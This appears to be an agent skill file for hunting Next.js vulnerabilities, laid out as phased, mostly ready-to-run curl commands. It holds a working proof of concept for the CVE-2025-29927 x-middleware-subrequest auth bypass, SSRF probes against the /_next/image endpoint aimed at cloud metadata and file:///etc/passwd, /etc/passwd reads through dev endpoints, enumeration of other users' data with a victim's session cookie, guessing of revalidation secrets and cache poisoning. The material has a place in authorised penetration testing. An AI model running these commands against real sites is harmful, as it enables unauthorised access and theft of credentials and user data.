---
name: hunt-nextjs
description: "Hunt Next.js specific vulnerabilities — Server Actions arbitrary function execution, Middleware auth bypass via static asset paths, ISR cache poisoning, Image Optimization SSRF (/_next/image), RSC payload leakage, getServerSideProps injection, source map exposure, debug endpoint leakage. Use when target runs Next.js 13/14/15 or any React SSR framework."
sources: "cve_database (CVE-2024-34351 / GHSA-fr5h-rqp8-mj6g), Next.js advisories"
---

# HUNT-NEXTJS — Next.js / SSR Framework Vulnerabilities

## Crown Jewel Targets

Next.js-specific bugs that bypass auth or reach SSRF = High/Critical.

**Highest-value chains:**
- **Server Actions auth bypass** — Server Actions enforce auth client-side only → call action ID directly → unauthorized data mutation or exfil
- **Middleware bypass via `/_next/static/`** — middleware skips static asset paths → protected routes accessible via `/_next/data/` IDOR
- **`/_next/image` SSRF** — Image optimizer fetches attacker-controlled URL → internal network scan or cloud metadata
- **ISR stale cache poisoning** — inject malicious content into a cached page that gets served to all users
- **RSC payload leakage** — React Server Component flight data contains server-side props not meant for client

---

## Attack Surface Signals

```
/_next/image?url=&w=&q=          Image optimizer — SSRF candidate
/_next/data/BUILD_ID/*.json      Prerendered page data — IDOR candidate
/__nextjs_original-stack-frame   Debug stack frame endpoint
/_next/static/chunks/            JS bundles — source map candidate
/api/                            API routes — standard hunt surface
__NEXT_DATA__ in HTML            SSR props leaked to client
x-nextjs-* response headers      Confirms Next.js
```

---

## Phase 1 — Fingerprint & Version Detection

```bash
# Confirm Next.js and get build ID
curl -s https://$TARGET/ | grep -oP '"buildId":"[^"]+"'
curl -sI https://$TARGET/ | grep -i "x-powered-by\|x-nextjs"

# Extract build ID for /_next/data/ paths
BUILD_ID=$(curl -s https://$TARGET/ | grep -oP '"buildId":"\K[^"]+')
echo "Build ID: $BUILD_ID"

# Check Next.js version via package disclosure
curl -s https://$TARGET/_next/static/chunks/framework*.js | grep -oP '"next":"[^"]+"'

# Source map exposure
curl -s "https://$TARGET/_next/static/chunks/pages/index.js.map" | head -5
curl -s "https://$TARGET/_next/static/chunks/main.js.map" | head -5
```

---

## Phase 2 — Server Actions Abuse

```bash
# Server Actions in Next.js 14+ use x-action-id or Next-Action header
# Find action IDs in HTML source or JS bundles
curl -s https://$TARGET/ | grep -oP '"action":"[a-f0-9]+"'
grep -r "createActionURL\|$$ACTION_" recon/$TARGET/ --include="*.js" 2>/dev/null

# Call Server Action directly without auth
curl -s -X POST https://$TARGET/target-page \
  -H "Next-Action: ACTION_ID_HERE" \
  -H "Content-Type: multipart/form-data; boundary=----" \
  -H "Cookie: " \
  --data-raw $'------\r\nContent-Disposition: form-data; name="1"\r\n\r\n[]\r\n------\r\n'

# Test: does the action execute without a valid session?
# If it returns data or mutates state → auth enforcement is client-side only
```

---

## Phase 3 — Middleware Auth Bypass

```bash
# Next.js middleware runs on edge runtime and may skip certain paths
# Test protected route directly
curl -s -o /dev/null -w "%{http_code}" https://$TARGET/admin/dashboard
# → 200 means accessible

# Test via /_next/data/ (SSG/ISR JSON) — middleware may not apply
curl -s "https://$TARGET/_next/data/$BUILD_ID/admin/dashboard.json"

# Test via static asset path prefix (middleware matcher may exclude /_next/static)
curl -s "https://$TARGET/_next/static/../admin/dashboard"

# Encoded path bypass
curl -s "https://$TARGET/%5Fnext/data/$BUILD_ID/admin/users.json"
curl -s "https://$TARGET/_next/data/$BUILD_ID/..%2Fadmin%2Fusers.json"
```

---

## Phase 3b — CVE-2025-29927 Middleware Bypass (`x-middleware-subrequest`)

CVE-2025-29927 (March 2025, Critical): Next.js trusts the internal `x-middleware-subrequest` request header to mark a request as an already-handled subrequest and SKIP middleware execution entirely. Any auth/authorization check implemented in `middleware.ts` is bypassed by sending that header from outside. The PoC value chains the middleware path token to match nesting depth (`middleware:middleware:...`); for a `src/` layout the token is `src/middleware`.

```bash
# Probe: pick a route whose protection lives in middleware (auth gate / redirect)
PROT="/dashboard"   # or /admin, /account — a middleware-guarded route

# 1) Baseline — request normally with NO auth (expect 307/302 redirect or 401/403)
curl -s -o /dev/null -w "baseline=%{http_code}\n" "https://$TARGET$PROT"

# 2) Resend with the bypass header. Try increasing token depth and the src/ variant.
for H in \
  "middleware" \
  "middleware:middleware" \
  "middleware:middleware:middleware:middleware:middleware" \
  "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware" ; do
  echo -n "subrequest='$H' -> "
  curl -s -o /dev/null -w "%{http_code}\n" \
    -H "x-middleware-subrequest: $H" "https://$TARGET$PROT"
done

# VULNERABLE if a header request returns 200 + the protected content while the
# baseline was a 307/302/401/403. Diff the bodies to confirm real protected
# content (not just a status flip) before reporting.
```

curl PoC (single shot, deep token):

```bash
curl -i "https://$TARGET/admin" \
  -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
# 200 + admin page body (instead of the login redirect) = auth bypass confirmed
```

**Affected / fixed versions** (versions below the fix on each release line are vulnerable):

| Release line | Vulnerable | Fixed in |
|---|---|---|
| 15.x | < 15.2.3 | 15.2.3 |
| 14.x | < 14.2.25 | 14.2.25 |
| 13.x | < 13.5.9 | 13.5.9 |
| 12.x | < 12.3.5 | 12.3.5 |

> Only applies when auth/authorization is enforced in Next.js Middleware. Apps with no middleware, or that gate access in route handlers/Server Components, are not exploitable via this header. Confirm the version (Phase 1) and that the protected route is middleware-gated before claiming impact.

---

## Phase 4 — Image Optimization SSRF (`/_next/image`)

```bash
# Basic SSRF test — internal metadata
curl -s "https://$TARGET/_next/image?url=http://169.254.169.254/latest/meta-data/&w=64&q=75"

# Protocol bypass attempts
curl -s "https://$TARGET/_next/image?url=file:///etc/passwd&w=64&q=75"
curl -s "https://$TARGET/_next/image?url=http://127.0.0.1:6379/&w=64&q=75"

# OOB detection — use a UNIQUE per-test subdomain so callbacks can't be confused
COLLAB="http://UNIQUE.COLLAB_HOST"
curl -s "https://$TARGET/_next/image?url=$COLLAB/nextjs-ssrf&w=64&q=75"
# Check Interactsh/Burp Collaborator for DNS/HTTP callback on that exact subdomain
```

**FALSE-POSITIVE GUARD (read before claiming SSRF):** `/_next/image` only
fetches URLs allowed by `images.remotePatterns` / `images.domains` in
`next.config.js`. A non-whitelisted `url` returns **400 by default** — that is
the optimizer's normal allowlist rejection, NOT a "block" you bypassed. A **200**
returns an *optimized image*, not the upstream response body, so a status code
alone NEVER confirms SSRF. Confirm only via an **out-of-band callback to a unique
Collaborator subdomain** (above), or by body-diffing a known-internal vs
known-external target. Do not report on status code.

> Note: CVE-2024-34351 (Next.js SSRF, GHSA-fr5h-rqp8-mj6g, affects 13.4.0
> through < 14.1.1, fixed in 14.1.1) is a **Server Actions** SSRF — a relative
> redirect that trusts the `Host` header — NOT a `/_next/image` bug, and it does
> NOT affect Host-routed providers like Vercel. See Phase 2 for the Server
> Actions surface.

---

## Phase 5 — `/_next/data/` IDOR & Data Leakage

```bash
# Enumerate prerendered JSON for user-specific data
# Pattern: /_next/data/BUILD_ID/[page].json or /_next/data/BUILD_ID/[dynamic]/[id].json
curl -s "https://$TARGET/_next/data/$BUILD_ID/profile.json" \
  -H "Cookie: session=VICTIM_SESSION"

# Try other users' data
for ID in 1 2 3 100 1000; do
  curl -s "https://$TARGET/_next/data/$BUILD_ID/users/$ID.json" | head -3
done

# Check __NEXT_DATA__ in HTML for sensitive server-side props
curl -s "https://$TARGET/dashboard" | \
  python3 -c "import sys,re,json; m=re.search(r'<script id=\"__NEXT_DATA__\"[^>]*>(.*?)</script>',sys.stdin.read(),re.S); print(json.dumps(json.loads(m.group(1)),indent=2) if m else 'not found')"
```

---

## Phase 6 — ISR Cache Poisoning

```bash
# ISR pages regenerate on request after revalidation period
# If user input influences the static page content without sanitization:
# 1. Trigger revalidation with malicious input in URL/query
# 2. Injected content cached and served to all users

# Test: does query param affect cached page content?
# Use a UNIQUE marker (not a generic <script>) so a match proves YOUR input landed,
# and confirm the response was actually CACHED + served to a DIFFERENT client.
MARK="zqx$(date +%s)"
# 1) Poison with the marker
curl -s "https://$TARGET/blog/test-post?preview=<b>$MARK</b>" -o /dev/null
# 2) Re-fetch the CLEAN url (no query) from a fresh client and grep the marker.
#    Body-diff clean-vs-poisoned and check x-nextjs-cache / age headers — a reflected
#    marker WITHOUT proof it persists in the cache key is just reflection, not poisoning.
curl -si "https://$TARGET/blog/test-post" | grep -iE "$MARK|x-nextjs-cache|age:"

# On-demand revalidation endpoint (if exposed)
curl -s "https://$TARGET/api/revalidate?secret=GUESS&path=/blog/test"
curl -s "https://$TARGET/api/revalidate?token=GUESS&path=/admin"
```

---

## Phase 7 — Debug & Stack Frame Endpoints

**Precondition:** `__nextjs_launch-editor` and `__nextjs_original-stack-frame`
are react-dev-overlay middleware mounted ONLY under `next dev`. A production
build (`next build && next start`) does not register these routes — a 404 here
is the normal, expected result, not a "filter" you need to bypass. They are
reachable ONLY in the rare misconfiguration of literally running `next dev` in
production. Treat any non-404 as the real finding; do NOT report a 404/filtered
response as confirmation.

```bash
# First confirm dev mode is actually exposed (anything but 404 = dev server in prod)
curl -s -o /dev/null -w "%{http_code}" \
  "https://$TARGET/__nextjs_original-stack-frame?isServer=true&errorMessage=test"

# Only if the above is NOT 404: the launch-editor / stack-frame endpoints can
# reference local files (file-read surface of a dev server wrongly exposed)
curl -s "https://$TARGET/__nextjs_launch-editor?file=../../etc/passwd&line=1"
curl -s "https://$TARGET/__nextjs_original-stack-frame" \
  --data '{"file":"/etc/passwd","line":1,"column":1}'
```

---

## Phase 8 — Environment Variable Leakage

```bash
# NEXT_PUBLIC_* vars are baked into JS bundles — grep for secrets
curl -s "https://$TARGET/_next/static/chunks/pages/_app.js" | \
  grep -oE "NEXT_PUBLIC_[A-Z_]+['\"]?\s*[:=]\s*['\"]?[^'\"&\s]+"

# Check for non-public vars accidentally exposed
curl -s https://$TARGET/ | python3 -c "
import sys, re, json
m = re.search(r'__NEXT_DATA__.*?({.*?})</script>', sys.stdin.read(), re.S)
if m:
    d = json.loads(m.group(1))
    print(json.dumps(d.get('props', {}), indent=2))
"
```

---

## Chain Table

| Next.js finding | Chain to | Impact |
|----------------|----------|--------|
| Server Action no auth | Call privileged mutations directly | Data manipulation / admin access |
| `/_next/image` SSRF | Cloud metadata → IAM creds | Cloud compromise |
| `/_next/data/` IDOR | Other users' server-side props | PII / token exfil |
| Middleware bypass | Protected admin routes | Auth bypass |
| CVE-2025-29927 `x-middleware-subrequest` | Skip middleware → reach any middleware-gated route | Auth/authz bypass (Critical) |
| Source map exposed | Reconstruct TS source → find hardcoded secrets | Further vulns |
| `__NEXT_DATA__` leaks | Server-side secrets in HTML | API keys / tokens |

---

## Validation

✅ Server Action: action executes without valid session, returns data or mutates state
✅ SSRF: DNS/HTTP callback received from `/_next/image` SSRF
✅ Middleware bypass: 200 response on protected route without auth cookie
✅ CVE-2025-29927: `x-middleware-subrequest` header flips baseline 307/401 → 200 with real protected body, and version is below the fixed release
✅ Data leak: `__NEXT_DATA__` contains non-public secrets or other users' PII

**Severity:**
- Server Action auth bypass → data mutation: High/Critical
- Image SSRF → cloud metadata: Critical
- Middleware bypass → admin panel: High
- Source map exposure only: Low-Medium

---

## Related Skills

- **`hunt-ssrf`** — `/_next/image` and the CVE-2024-34351 Server Actions relative-redirect are the Next.js SSRF surfaces. Chain primitive: confirm OOB callback from `/_next/image` → aim at cloud metadata (IMDS) → IAM credential theft.
- **`hunt-nodejs`** — Next.js runs on Node; API routes inherit prototype-pollution, SSTI, and `child_process` sinks. Chain primitive: Next.js confirmed → also run the `hunt-nodejs` Express/Node sink probes against `/api/` routes.
- **`hunt-idor`** — `/_next/data/<buildId>/...json` and `__NEXT_DATA__` expose server-side props with no object-level auth. Chain primitive: enumerate per-user prerendered JSON → verifiable cross-account artifact → IDOR.
- **`hunt-auth-bypass`** — middleware that skips static-asset paths leaves protected routes reachable. Chain primitive: middleware matcher excludes `/_next/` → request the protected route directly → auth bypass.
- **`hunt-source-leak`** — exposed `.js.map` source maps reconstruct TypeScript source and hardcoded secrets. Chain primitive: `hunt-source-leak` pulls maps → recover server logic / `NEXT_PUBLIC_*` and accidentally-bundled secrets.
- **`hunt-cache-poison`** — ISR pages cached from user-influenced input are poisonable. Chain primitive: prove a unique marker persists in the cache key and is served to a fresh client.
- **`triage-validation`** — status-code-only SSRF and reflected-not-cached markers are the dominant false positives here. Chain primitive: enforce the OOB / body-diff gate before reporting.
